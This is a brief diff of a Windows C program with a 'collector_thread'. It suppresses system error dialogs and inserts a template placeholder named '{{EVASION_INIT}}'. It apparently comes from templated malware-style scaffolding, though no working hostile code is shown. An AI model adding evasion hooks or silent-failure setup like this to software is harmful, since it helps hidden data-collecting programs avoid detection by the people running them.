@@ -17,6 +17,7 @@ static DWORD WINAPI collector_thread(LPVOID param) {
 int main(int argc, char *argv[]) {
     (void)argc; (void)argv;
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
+{{EVASION_INIT}}
 
     init_buffer();
     if (!g_data) return 1;
